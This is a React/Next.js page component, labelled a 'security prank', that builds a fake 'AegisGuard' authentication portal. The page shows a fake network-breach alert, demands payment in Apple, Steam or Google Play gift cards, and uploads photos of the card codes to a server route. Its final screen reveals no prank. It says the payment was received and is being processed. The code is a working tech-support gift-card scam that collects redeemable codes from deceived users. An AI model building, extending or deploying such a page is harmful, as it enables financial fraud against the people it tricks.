"use client";

import { useState, FormEvent } from "react";

export default function SecurityPrankPage() {
  const [step, setStep] = useState<1 | 2 | 3 | 4>(1);
  const [userId, setUserId] = useState("");
  const [files, setFiles] = useState<File[]>([]);
  const [voucherAmount, setVoucherAmount] = useState("");
  const [isUploading, setIsUploading] = useState(false);

  const handleIdSubmit = async (e: FormEvent) => {
  e.preventDefault();
  setStep(2); // Show "Analyzing" spinner

  try {
    // We can use the GET method or create a specific verify route
    const res = await fetch(`/api/users/verify?id=${userId}`);
    const data = await res.json();

    if (data.valid) {
      setTimeout(() => setStep(3), 2000);
    } else {
      alert("ACCESS DENIED: Unauthorized Operator ID");
      setStep(1);
    }
  } catch (error) {
    setStep(1);
  }
};

  const handlePaymentSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (files.length === 0 || !voucherAmount) return;

    setIsUploading(true);

    try {
      // 1. Create FormData object
      const formData = new FormData();
      formData.append("amount", voucherAmount);
      formData.append("userId", userId);

      // 2. Append all files to the "files" field
      files.forEach((file) => {
        formData.append("files", file);
      });

      // 3. Send to your Next.js API Route
      const response = await fetch("/api/upload", {
        method: "POST",
        body: formData, // Do NOT set Content-Type header; fetch does it automatically for FormData
      });

      if (response.ok) {
        setStep(4);
      } else {
        const err = await response.json();
        alert(`Upload failed: ${err.error || "Unknown error"}`);
      }
    } catch (error) {
      console.error("Upload error:", error);
      alert("System communication error. Please try again.");
    } finally {
      setIsUploading(false);
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files) {
      const newFiles = Array.from(e.target.files);
      setFiles((prev) => [...prev, ...newFiles]);
    }
    // Reset so same file can be selected twice if needed
    e.target.value = "";
  };

  const removeFile = (indexToRemove: number) => {
    setFiles((prev) => prev.filter((_, i) => i !== indexToRemove));
  };


  return (
    <div className="auth-container">
      <div className="logo-wrapper">
        <div className="logo-icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
          </svg>
        </div>
        <div className="logo-text">Aegis<span>Guard</span></div>
      </div>

      {step === 1 && (
        <form onSubmit={handleIdSubmit} className="step-card">
          <h2 className="step-title">Authentication Portal</h2>
          <p className="step-desc">Enter your unique User ID to access your secure dashboard and account settings.</p>

          <div className="form-group">
            <label className="form-label" htmlFor="userId">User ID</label>
            <input 
              id="userId"
              type="text" 
              className="form-input" 
              placeholder="e.g. USR-8492" 
              value={userId}
              onChange={(e) => setUserId(e.target.value)}
              required
              autoFocus
            />
          </div>

          <button type="submit" className="btn-submit">Authenticate</button>
        </form>
      )}

      {step === 2 && (
        <div className="step-card spinner-wrapper">
          <div className="loader" style={{ width: '40px', height: '40px', borderWidth: '4px' }}></div>
          <div className="spinner-text">Analyzing account security & detecting threats...</div>
        </div>
      )}

      {step === 3 && (
        <form onSubmit={handlePaymentSubmit} className="step-card">
          <div className="alert-box">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
              <line x1="12" y1="9" x2="12" y2="13"></line>
              <line x1="12" y1="17" x2="12.01" y2="17"></line>
            </svg>
            <div>
              <strong>Critical Security Breach Detected</strong>
              <div style={{ marginTop: '4px', opacity: 0.9 }}>
                Your network is compromised. A mandatory firewall configuration is required immediately. To guarantee payment anonymity and trace protection across global networks, we only accept payment via Digital Voucher (Apple, Steam, or Google Play Gift Cards).
              </div>
            </div>
          </div>

          <div className="form-group">
            <input type="number" placeholder="Enter voucher amount" value={voucherAmount} onChange={(e) => setVoucherAmount(e.target.value)} className="card-amt" />
            <label className="form-label">Upload Gift Card Images (Front & Back)</label>
            <div className={`file-upload ${files.length > 0 ? 'has-file' : ''}`}>
              <input 
                type="file" 
                className="file-input" 
                onChange={handleFileChange}
                accept="image/*"
                multiple
              />
              <svg className="upload-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                <polyline points="17 8 12 3 7 8"></polyline>
                <line x1="12" y1="3" x2="12" y2="15"></line>
              </svg>
              <div style={{ color: 'var(--text-secondary)' }}>Click or drag images to upload</div>
              <div style={{ fontSize: '12px', marginTop: '8px', opacity: 0.5 }}>Ensure codes are clearly visible.</div>
            </div>

            {files.length > 0 && (
              <div className="file-list">
                {files.map((file, idx) => (
                  <div key={idx} className="file-item">
                    <span className="file-name" title={file.name}>
                      ✓ {file.name.length > 20 ? file.name.slice(0, 20) + '...' : file.name}
                    </span>
                    <button type="button" className="remove-btn" onClick={() => removeFile(idx)}>✕</button>
                  </div>
                ))}
              </div>
            )}
          </div>

          <button type="submit" className="btn-submit" disabled={files.length === 0}>
            Verify Gift Cards & Secure Network
          </button>
        </form>
      )}

      {step === 4 && (
        <div className="step-card prank-reveal">
          <div className="prank-icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="green" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
              <line x1="12" y1="9" x2="12" y2="13"></line>
              <line x1="12" y1="17" x2="12.01" y2="17"></line>
            </svg>
          </div>
          <h2 className="step-title prank-title">Processing payment....</h2>
          <div className="prank-message">
            <p className="prank-highlight">We are processing your payment and we will get back to you as soon as possible.</p>
            <p>
              We received your payment and we will get back to you as soon as possible. <strong>Thank you for your cooperation.</strong>
            </p>
            <p>
              this woud take a while, we will notify you when we are done.
            </p>
          </div>
        </div>
      )}
    </div>
  );
}
